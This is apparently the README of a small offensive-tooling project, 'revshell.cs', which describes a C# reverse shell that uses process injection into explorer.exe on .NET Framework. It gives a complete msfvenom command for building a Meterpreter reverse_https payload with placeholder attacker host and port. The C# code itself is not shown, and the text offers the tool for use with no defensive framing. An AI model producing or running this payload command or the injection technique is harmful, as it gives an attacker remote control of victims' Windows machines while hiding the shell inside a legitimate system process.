# revshell.cs
Here is a simple reverse shell by a process injection in explorer.exe in c# based on .Net Framework.

You will need to generate a shellcode based on the target architecture : msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=<LP> -f exe -o reverse_shell.exe
